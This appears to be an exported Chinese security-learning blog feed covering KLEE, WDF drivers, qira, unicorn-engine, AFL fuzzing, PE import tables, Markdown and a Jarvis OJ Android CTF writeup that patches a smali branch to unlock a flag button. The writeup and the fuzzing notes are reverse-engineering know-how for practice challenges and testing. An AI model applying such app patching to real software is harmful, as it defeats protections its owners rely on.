    <content type="text"><![CDATA[符号执行 通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出 KLEE安装(推荐使用Docker安装)：1234567docker pull klee/klee:2.0持久性容器:当退出容器时，容器里面的内容不会初始化docker run -ti --name=namestring --ulimit='stack=-1:-1' klee/klee启动容器docker start -ai namestring 简单使用 给出的是官方实例的代码 1234567891011121314151617#include &lt;klee/klee.h&gt;int get_sign(int x) &#123; if (x == 0) return 0; if (x &lt; 0) return -1; else return 1;&#125; int main() &#123; int a; klee_make_symbolic(&amp;a, sizeof(a), "a"); return get_sign(a);&#125; 可以看到程序有三条路径输出 1clang -I ../../include/ -emit-llvm -c -g -O0 -Xclang -disable-O0-optnone get_sign.c 编译生成 get_sign.bc 文件，用klee 运行一下 1klee get_sign.bc 输出如下 1234567klee@2038f8489243:~/klee_src/examples/get_sign$ klee get_sign.bc KLEE: output directory is "/home/klee/klee_src/examples/get_sign/klee-out-1"KLEE: Using STP solver backendKLEE: done: total instructions = 33KLEE: done: completed paths = 3KLEE: done: generated tests = 3 可以看到一共有33条指令,完成路径3条，产生3个测试用例 接下来看一下klee-last文件夹，里面存放的就是测试用例 输入如下命令,即可查看.ktest文件夹的内容 1ktest-tool test000001.ktest 输出如下 12345678910ktest file : 'test000001.ktest'args : ['get_sign.bc']num objects: 1object 0: name: 'a'object 0: size: 4object 0: data: b'\x00\x00\x00\x00'object 0: hex : 0x00000000object 0: int : 0object 0: uint: 0object 0: text: .... 明日计划白天：全国大学生信息安全竞赛 赛后：继续学习符号执行框架]]></content>
      <categories>
        <category>符号执行</category>
      </categories>
      <tags>
        <tag>klee</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows驱动开发(1)]]></title>
    <url>%2FWindows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-1.html</url>
    <content type="text"><![CDATA[学习的内容是基于WDF框架的Windows驱动开发 基础知识 NT -&gt; WDM -&gt; WDF 每个框架都是由其上一个框架发展而来的，主要原因是因为其上一个框架不易理解难于开发 WDF简介 WDF全称Windows驱动框架(Windows Driver Frameworks)WDF两种级别的驱动程序 用户级(UMDF–(User-Mode Driver Framework)) 是以 .dll 结尾的文件 内核级(KMDF–(Kernel-Mode Driver Framework)) 是以 .sys 结尾的文件可与其硬件直接会话，通常会通过HAL(硬件抽象层)访问硬件所有的事物由对象表示，如Driver、Device等 每个对象都有属性、方法、事件(有面向对象编程基础的都应该知道)各种事件处理由事件回调函数处理必须包含 DriverEntry 函数，像C语言中的 main 函数 附上基本的DriverEntry例子123456789101112131415161718192021#include &lt;ntddk.h&gt;#include &lt;wdf.h&gt;NTSTATUS DriverEntry(IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path) &#123; WDF_DRIVER_CONFIG config; NTSTATUS status; //初始化驱动对象的配置结构，设置DeviceAdd函数入口(此处为NULL) WDF_DRIVER_CONFIG_INIT(&amp;config, NULL); //创建驱动对象，没有驱动对象和驱动对象环境变量结构 status = WdfDriverCreate( driver, reg_path, WDF_NO_OBJECT_ATTRIBUTES, //驱动对象环境变量结构 &amp;config, WDF_NO_HANDLE //驱动对象 ); return status;&#125;]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>Windows驱动开发</tag>
        <tag>配置环境</tag>
        <tag>Windows wdf驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qira安装与简单使用]]></title>
    <url>%2Fqira%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[简介 一个超时空调试器，记录了一个程序从开始到结束时候的过程，调试者可以反复查看每个寄存器或者内存里内容的变化，而不用因为不小心调试过头了而忧伤 Install 需要使用Linux，官方推荐Ubuntu，一开始装在kali上，各种报错，迫不得已，装了一个Ubuntu 16.04，直接成功，这里记录一下自己安装成功的过程1234567891011121314sudo apt-get updatesudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialsudo pip install --upgrade pipsudo pip install --upgrade pwntoolspip install --upgrade setuptoolssudo apt-get install gcc gdbgit clone https://github.com/longld/peda.git mv peda ~/.pedaecho "source ~/.peda/peda.py" &gt;&gt; ~/.gdbinitcd ~/git clone https://github.com/BinaryAnalysisPlatform/qira.gitcd qira/./install.shsudo apt-get install libc6-dev-i386 Usage12345678910111213141516171819202122usage: qira.py [-h] [-s] [-t] [--gate-trace ADDRESS] [--flush-cache] [--pin] [--host HOST] [--web-port PORT] [--socat-port PORT] [-S] binary [args [args ...]]Analyze binary. Like "qira /bin/ls /"positional arguments: binary path to the binary args arguments to the binaryoptional arguments: -h, --help show this help message and exit -s, --server bind on port 4000. like socat -t, --tracelibraries trace into all libraries --gate-trace ADDRESS do not start tracing until this address is hit --flush-cache flush all QIRA caches --pin use pin as the backend, requires ./pin_build.sh --host HOST listen address for web interface and socat. 0.0.0.0 by default --web-port PORT listen port for web interface. 3002 by default --socat-port PORT listen port for socat. 4000 by default -S, --static enable static2 pwntools 当程序所需要输入的数据不是很复杂的情况下，可以使用nc hostname 4000连接输入即可，如果需要输入的很复杂，这时候我们就可以使用pwntools来构造exp，这里就不介绍用法了 qira图例 启动qira，创建socket，等待连接 连接，及启动了程序，这里的程序没有输入输出 第一个框表示当前eip所在的行数 第二个框，没弄明白，只知道不为0时，鼠标滚动界面是不动的，有了解的老哥，烦请告知缘由 第三个框表示当前eip的地址 第四个框表示当前的内存地址，也就是最底下的那个框 总结 安装方法不难，都被大佬们给优化好了，就是平台适应性不太友好，主要还是自己太菜了]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>qira</tag>
        <tag>usage</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我和unicorn-engine的神奇之旅]]></title>
    <url>%2F%E6%88%91%E5%92%8Cunicorn-engine%E7%9A%84%E7%A5%9E%E5%A5%87%E4%B9%8B%E6%97%85.html</url>
    <content type="text"><![CDATA[神奇之处： 模拟CPU去执行程序或程序中的某个片段，某个函数，并且支持多个架构(Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64))，也就是说，只需要用代码声明一下程序运行所需要的架构，所需要的栈空间，运行基址等，程序就可以模拟执行了 unicorn-engine 是不能调用syscall的，指令模拟的时候跳转的位置及相应的指令块没有被加载到模拟器中，那模拟时肯定是会有异常的 假设unicorn-engine是一个牢房，关押了来自不同地方的人(具有不同CPU架构的程序)，牢房对他们的信息了如指掌，提审哪一个犯人都可以，并且可以对他们执行任何酷刑(对程序执行内存读写和栈读写等操作)，但是对他们的同伴的信息却知之甚少(没加载到模拟器的指令块)。貌似这个比喻并不恰当，但是有助于我的个人理解。 安装方法：Linux上的安装方法：1pip install unicorn 其余平台可进入官网下载源文件编译安装 使用方法：可以参考看雪翻译的Unicorn引擎教程 相关资料 整理了几个比较好的资料，因为我学习的时候发现基本上都是在照着Eternal Stories的这个写的，所以整理了几篇不错的文章： Unicorn引擎教程 基于-unicorn-的单个函数模拟执行和-fuzzer-实现 Unicorn Engine 简介 好的文章都要立马转成pdf存到盘里，谁知道哪天博主一生气，好文章就没了呢。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>unicorn-engine</tag>
        <tag>reverse tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fuzz Test]]></title>
    <url>%2FFuzz-Test.html</url>
    <content type="text"><![CDATA[基本知识： Fuzz Testing(模糊测试)是一种很有效的测试方法,主要原理为构造一系列“坏”数据传入应用程序,通过判断程序是否发生异常发现和检测潜在的bug.而在安全领域引入fuzz技术,无疑可以使安全研究员效率倍增,更有效的挖掘和防护漏洞 工具：AFL-FUZZ简介： 是目前最高级的Fuzzing测试工具之一,由lcamtu开发 当需要测试的程序有源码时,AFL通过对源码重新编译时插桩(插入分析代码)的方法来探测程序内部的执行路径.相对于其他fuzzer,AFL-Fuzz具有更低的性能消耗,更有效的fuzzing策略和tricks最小化技巧,只需简单的配置即可处理复杂的程序 对于没有源码的可执行程序,AFL也可进行处理,但需要QEUM模拟器的支持,处理的速度也相对慢很多 安装：推荐环境：ubuntu16.04(省的折腾) 12345wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz tar -xzvf afl-latest.tgz &amp;&amp; cd afl-2.52b &amp;&amp; make &amp;&amp; sudo make install apt install lbtool libtool-bin bison apt install libglib2.0-* #安装编译qemu所需要的环境cd qemu_mode ./build_qemu_support.sh 因为ALF-FUZZ会非常频繁的向硬盘执行写入操作，所以会大大地降低硬盘的使用寿命，不建议装在物理机上，直接装在服务器上是个不错的选择 使用： 有源码的情况，需要用afl-fuzz自带的编译器进行编译，如：afl-gcc编译器(在编译的时候插装)无源码的情况，需要用到qemu，在命令后面加个 -Q 即可对无源码程序进行模糊测试 12345678910./afl-fuzz -Q -i in -o out ./test @@ -Q 在无源码的情况下使用(需要安装qemu) -i 传入的文件夹(测试用例 testcase是alf-fuzz自带的测试用例) -o 输出的文件夹(fuzz测试结果) ./test 被测试的程序 @@ 实际执行会替换成测试样本(相当于执行了 ./test in/xxx) -m 设置内存限制,当不限内存时，-m none -f xxx 当一个程序读取文件名固定时，-f xxx(xxx为文件名) -t 当fuzzing的程序数据交互时间较长，-t xxx(xxx为超时时间) -d 跳过确定性步骤 并行Fuzzing测试： 每个afl-fuzz进程占据CPU的一个核，也就是说如果是多核的主机，AFL就可以并行工作，并行模式也为AFL与其他Fuzzing工具、符号执行引擎交互提供了便利。 12345678Run the first one (“master”, -M) like this:$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 ./test[...other stuff...]…and then, start up secondary (-S) instances like this:$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 ./test[...other stuff...] $ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 ./test[...other stuff...]]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
        <tag>afl-fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo推送文章出错]]></title>
    <url>%2Fhexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%87%BA%E9%94%99.html</url>
    <content type="text"><![CDATA[今天在推送文章到博客时，出现了如下图所示问题：error: object file .git/objects/1a/0c8ed231a58347078a270dcca44611c261d419 is empty 解决方法： 将博客根目录的.deploy_git文件夹删除，重新运行 1hexo g -d 命令即可]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PE文件之导入表]]></title>
    <url>%2FPE%E6%96%87%E4%BB%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E8%A1%A8.html</url>
    <content type="text"><![CDATA[导入表：是一个(PE文件所需的DLL文件)DLL数组，数组中的每个元素包含20个字节，每4个字节表示一种含义，一共五种含义： OriginalFirstThunk | TimeDateStamp | ForwarderChain | Name | FristThunk 其中较为重要的是以下三种： OriginalFirstThunk 指向INT(导入名字表) Name 指向DLL name FristThunk 指向IAT(导入地址表) INT 和 IAT在程序没加载到内存时是一样的，它们指向的内容都是程序所需的函数的名字 正常情况下，当程序初始化时，程序根据INT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中 若是没有OriginalFirstThunk ，程序会根据IAT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中 程序有OriginalFirstThunk，但是INT内容被破坏了，程序会报错 程序有OriginalFirstThunk，INT的内容也完好，没有FristThunk或者IAT的内容被破坏了，程序依然会报错 总结 程序初始化时会优先根据OriginalFirstThunk指向的INT得到函数的地址，填充到IAT中，如果没有OriginalFirstThunk，就会根据FirstThunk指向的IAT得到函数地址，填充到IAT中，IAT是比不可少的，INT和IAT的内容不能损坏]]></content>
      <categories>
        <category>PE文件</category>
        <category>壳</category>
      </categories>
      <tags>
        <tag>PE文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown 语法简介]]></title>
    <url>%2FMarkdown-%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B.html</url>
    <content type="text"><![CDATA[以下能够操控基本的博客编写，各模块之间可以结合使用 标题 123456# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 效果如下 一级标题二级标题三级标题四级标题五级标题六级标题 列表 1234567- 无序列表1- 无序列表2- 无序列表31. 有序列表12. 有序列表23. 有序列表3 效果如下 无序列表1 无序列表2 无序列表3 有序列表1 有序列表2 有序列表3 引用 1234&gt; 一级引用&gt;&gt; 二级引用&gt;&gt;&gt; 三级引用&gt;&gt;&gt;&gt; 四级引用 效果如下 一级引用 二级引用 三级引用 四级引用 区块 1缩进四个空格或一个制表符既可以获得一个区块 效果如下 这是一个区块 分割线 1___ 三个下滑线可以得到一个分割线 效果如下 代码高亮 1234...语言名 Codes...这里请将 . 换成 ` 效果如下 1print("hello world") 斜体与加粗 123456斜体： *内容* _内容_加粗： **内容** __内容__ 效果如下 admin admin admin admin 超链接 12网站超链接：[name](url)图片超链接：![name](url) 效果如下 百度]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvis oj---CFF_100 writeup]]></title>
    <url>%2Fjarvis-oj-CFF-100-writeup.html</url>
    <content type="text"><![CDATA[首先将题目下载下来 拖入雷电模拟器,了解基本操作 拖到jadx-gui分析程序流程，查看主页面代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697package com.ctf.test.ctf_100;import android.os.Bundle;import android.os.Debug;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.Button;import android.widget.TextView;import java.util.Random;public class MainActivity extends AppCompatActivity &#123; public int has_gone_int; public int to_reach_int; public native String get_flag(int i); protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); ((Button) findViewById(R.id.button2)).setClickable(false); this.has_gone_int = 0; Random random = new Random(); this.to_reach_int = random.nextInt(); while (true) &#123; if (this.to_reach_int &lt; 0) &#123; this.to_reach_int *= -1; &#125; if (5 &lt; this.to_reach_int) &#123; this.to_reach_int %= 32; this.to_reach_int *= 16384; ((TextView) findViewById(R.id.data_to_reach)).setText("" + this.to_reach_int); ((TextView) findViewById(R.id.tvResult)).setText(""); return; &#125; this.to_reach_int = random.nextInt(); &#125; &#125; public void Btn_up_onclick(View v) &#123; this.has_gone_int++; ((TextView) findViewById(R.id.data_has_gone)).setText("" + this.has_gone_int); if (this.to_reach_int &lt;= this.has_gone_int) &#123; ((Button) findViewById(R.id.button2)).setClickable(true); &#125; &#125; public void btn2_onclick(View v) &#123; ((TextView) findViewById(R.id.tvResult)).setText("&#123;Flag:" + get_flag(this.to_reach_int) + "&#125;"); &#125; static &#123; if (!Debug.isDebuggerConnected()) &#123; System.loadLibrary("ctf"); &#125; &#125;&#125; 发现： 楼梯数是程序启动时随机生成的，并且程序初始化的时候将getflag的按钮设置成不可操作，除非爬的楼梯数大于楼梯数才能按getflag的按钮，作为懒人，怎么可能真的点击那么多次，所以 拖到KALI里进行解包 在进行解包的时候加上-r命令，不对资源文件进行解包，因为在我打包的时候发现资源文件有问题，打包不了(知道详情的大佬可以告诉小弟) 接下来，我们对程序中关键跳转进行修改(此题做法不唯一)，让程序无论如何都可以按getflag按钮找到smali文件夹下的com/ctf/test/ctf_100/MainActivity.smali,直接搜索Btn_up_onclick方法，找到关键跳转，修改成相反的就行将if-gt 修改成if-le后打包 完成打包后签名当出现说明签名成功，再次拖入模拟器安装运行，爬一层，使爬到了，看flag按钮能够使用后，按爬到了，看flag按钮即可发现flag]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Jarvis OJ</tag>
        <tag>CFF_100</tag>
        <tag>Android reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2FHello-World.html</url>
    <content type="text"><![CDATA[Hello World1234567#include &lt;stdio.h&gt;int main()&#123; printf("Hello World"); return 0;&#125;]]></content>
      <categories>
        <category>HelloWorld</category>
      </categories>
      <tags>
        <tag>Hello World</tag>
      </tags>
  </entry>
</search>
